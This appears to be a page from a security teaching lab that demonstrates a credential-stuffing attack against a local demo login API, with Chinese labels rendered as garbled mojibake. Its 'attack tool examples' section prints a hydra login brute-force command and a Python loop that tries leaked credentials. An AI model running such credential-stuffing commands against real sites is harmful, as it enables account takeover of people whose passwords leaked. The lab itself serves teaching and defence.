<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>æ’åº“æ”»å‡»æ¼”ç¤º - Security Lab</title>
  <link rel="stylesheet" href="../xss/style.css">
  <style>
    .attack-log { background: #1a1a2e; color: #0f0; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 12px; max-height: 300px; overflow: auto; }
    .log-success { color: #4caf50; }
    .log-fail { color: #f44336; }
    .progress-bar { width: 100%; height: 20px; background: #ddd; border-radius: 10px; overflow: hidden; margin: 10px 0; }
    .progress-fill { height: 100%; background: linear-gradient(90deg, #4caf50, #8bc34a); transition: width 0.3s; }
    .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin: 15px 0; }
    .stat-card { background: #0f3460; padding: 15px; border-radius: 8px; text-align: center; color: #eee; }
    .stat-value { font-size: 24px; font-weight: bold; }
  </style>
</head>
<body>
  <div class="container">
    <a href="index.html" class="back-link">â† è¿”å›æ’åº“æ”»å‡»</a>
    <h1>ğŸ¯ å®éªŒä¸€ï¼šæ’åº“æ”»å‡»æ¼”ç¤º</h1>

    <div class="warning-box">
      <strong>âš ï¸ æ”»å‡»åœºæ™¯</strong>
      <p>æ”»å‡»è€…ä½¿ç”¨ä»å…¶ä»–ç½‘ç«™æ³„éœ²çš„å‡­è¯ï¼Œæ‰¹é‡å°è¯•ç™»å½•ç›®æ ‡ç½‘ç«™</p>
    </div>

    <section>
      <h2>ğŸ® æ”»å‡»æ§åˆ¶å°</h2>
      
      <div class="info-box">
        <h3>å•æ¬¡å°è¯•</h3>
        <div>
          <input type="email" id="email" value="alice@example.com" placeholder="é‚®ç®±" style="padding: 8px; margin: 5px; width: 200px;">
          <input type="password" id="password" value="alice123" placeholder="å¯†ç " style="padding: 8px; margin: 5px; width: 150px;">
          <button onclick="singleAttempt()" class="btn">å°è¯•ç™»å½•</button>
        </div>
        <div id="single-result" style="margin-top: 10px;"></div>
      </div>

      <div class="info-box" style="background: #3d1f1f; border: 2px solid #f44336;">
        <h3 style="color: #ff6b6b;">ğŸ”´ æ‰¹é‡æ’åº“æ”»å‡»</h3>
        <p>ä½¿ç”¨æ³„éœ²å‡­è¯åº“æ‰¹é‡å°è¯•ï¼ˆå…± <span id="total-creds">7</span> æ¡å‡­è¯ï¼‰</p>
        <button onclick="batchAttack()" class="btn" style="background: #f44336;">å¼€å§‹æ’åº“æ”»å‡»</button>
        
        <div class="progress-bar" style="margin-top: 15px;">
          <div class="progress-fill" id="progress" style="width: 0%;"></div>
        </div>
      </div>
    </section>

    <section>
      <h2>ğŸ“Š æ”»å‡»ç»“æœ</h2>
      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-value" id="stat-total">0</div>
          <div>æ€»å°è¯•</div>
        </div>
        <div class="stat-card" style="background: #1b4332;">
          <div class="stat-value" id="stat-success" style="color: #4caf50;">0</div>
          <div>æ’åº“æˆåŠŸ</div>
        </div>
        <div class="stat-card" style="background: #3d1f1f;">
          <div class="stat-value" id="stat-fail" style="color: #f44336;">0</div>
          <div>å¤±è´¥</div>
        </div>
      </div>
    </section>

    <section>
      <h2>ğŸ“œ æ”»å‡»æ—¥å¿—</h2>
      <div class="attack-log" id="attack-log">
[ç­‰å¾…æ”»å‡»å¼€å§‹...]
      </div>
    </section>

    <section>
      <h2>ğŸ’€ æ’åº“æˆåŠŸçš„è´¦æˆ·</h2>
      <div id="compromised" class="info-box">
        <p>æš‚æ— </p>
      </div>
    </section>

    <section>
      <h2>ğŸ› ï¸ æ”»å‡»å·¥å…·ç¤ºä¾‹</h2>
      <pre><code># ä½¿ç”¨ hydra è¿›è¡Œæ’åº“
hydra -L emails.txt -P passwords.txt target.com http-post-form \
  "/login:email=^USER^&password=^PASS^:Invalid"

# ä½¿ç”¨ Python è„šæœ¬
import requests
for email, password in leaked_credentials:
    r = requests.post(url, data={'email': email, 'password': password})
    if 'success' in r.text:
        print(f'[+] Found: {email}:{password}')</code></pre>
    </section>
  </div>

  <script>
    let compromised = []
    
    async function singleAttempt() {
      const email = document.getElementById('email').value
      const password = document.getElementById('password').value
      
      const res = await fetch('/api/credential/unsafe/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })
      })
      const data = await res.json()
      
      document.getElementById('single-result').innerHTML = `
        <span style="color: ${data.success ? '#4caf50' : '#f44336'}">
          ${data.success ? 'âœ… ' + data.message : 'âŒ ' + data.error}
        </span>
      `
    }
    
    async function batchAttack() {
      const log = document.getElementById('attack-log')
      log.innerHTML = '[å¼€å§‹æ’åº“æ”»å‡»...]\n'
      compromised = []
      
      const res = await fetch('/api/credential/attack/batch', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      })
      const data = await res.json()
      
      // æ¨¡æ‹Ÿé€æ¡æ˜¾ç¤º
      let i = 0
      for (const result of data.results) {
        i++
        document.getElementById('progress').style.width = (i / data.total * 100) + '%'
        
        const isSuccess = result.status.includes('æˆåŠŸ')
        log.innerHTML += `<span class="${isSuccess ? 'log-success' : 'log-fail'}">` +
          `[${i}/${data.total}] ${result.email} â†’ ${result.status}</span>\n`
        
        if (isSuccess) {
          compromised.push(result.email)
        }
        
        log.scrollTop = log.scrollHeight
        await new Promise(r => setTimeout(r, 200))
      }
      
      log.innerHTML += `\n[æ”»å‡»å®Œæˆ] æˆåŠŸ: ${data.success}/${data.total}\n`
      
      // æ›´æ–°ç»Ÿè®¡
      document.getElementById('stat-total').textContent = data.total
      document.getElementById('stat-success').textContent = data.success
      document.getElementById('stat-fail').textContent = data.total - data.success
      
      // æ˜¾ç¤ºè¢«æ”»ç ´çš„è´¦æˆ·
      if (compromised.length > 0) {
        document.getElementById('compromised').innerHTML = compromised.map(e => 
          `<div style="padding: 5px; margin: 3px 0; background: #ffebee; border-radius: 4px; color: #333;">ğŸ”“ ${e}</div>`
        ).join('')
      }
    }
  </script>
</body>
</html>
